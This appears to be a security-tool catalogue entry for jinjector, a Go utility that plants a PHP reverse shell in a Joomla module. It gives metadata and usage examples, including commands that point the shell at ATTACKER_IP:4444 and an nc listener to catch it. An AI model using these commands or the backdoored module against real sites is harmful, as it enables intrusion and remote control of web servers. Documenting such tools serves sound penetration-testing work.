---
name: "jinjector"
categories:
  - blackarch-backdoor
version: "25.c1578da"
homepage: "https://github.com/giovanni-iannaccone/Jinjector"
packaged-by: [blackarch]
blackarch-builddate: "2025-10-04"
build-system: go
license: GPL-3.0-or-later
meta-checked: "2026-11-09"
github-repo: "giovanni-iannaccone/Jinjector"
github-stars: 3
github-pushed: "2025-09-22"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.7
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# jinjector

> Go utility that appends a PHP reverse shell to a Joomla module's main file, turning an installable module into a backdoor delivery vehicle.

## What it's for

jinjector automates one specific trick: weaponizing a Joomla extension. Give it a decompressed Joomla module directory and it parses the module's XML manifest to find the declared main PHP file, then appends a reverse-shell payload (by default a bundled pentestmonkey-style PHP shell) to that file. When the tampered module is installed on a Joomla site and its position is rendered, the injected PHP tries to connect back to your IP and port. It does not exploit anything by itself — you need the ability to install the module (com_installer access) on the target site. Only the injection is automated; repackaging the module zip, delivering it, and catching the shell are on you.

*No corpus evidence — derived from upstream documentation.*

## Typical use cases

### Inject the default reverse shell into a Joomla module

Point jinjector at an unpacked module and your listener coordinates.

```
jinjector --ip=ATTACKER_IP --port=4444 --module=/opt/joomla/mod_custom
```

Outcome: jinjector reads the module's manifest, locates the main PHP file, and appends the bundled reverse shell configured to call ATTACKER_IP:4444; the module directory is now weaponized and ready to zip and install.

### Inject a custom PHP payload instead

Swap in your own PHP backdoor file for the default one.

```
jinjector --ip=ATTACKER_IP --port=4444 --module=/opt/joomla/mod_custom --backdoor=/opt/payloads/shell.php
```

Outcome: your `shell.php` contents (with `--ip`/`--port` substitution handled by the payload's placeholders, exactly as the default one does) are appended to the module's main file instead of the bundled backdoor.

### Catch the callback when the module is triggered

After installing the tampered module on the target site, wait for its first render.

```
nc -lvnp 4444
```

Outcome: when a request hits a page position where the module is displayed, the injected PHP executes and you receive an interactive shell from the web server user; no callback usually means the module's position has not been rendered yet or outbound traffic to your port is filtered.
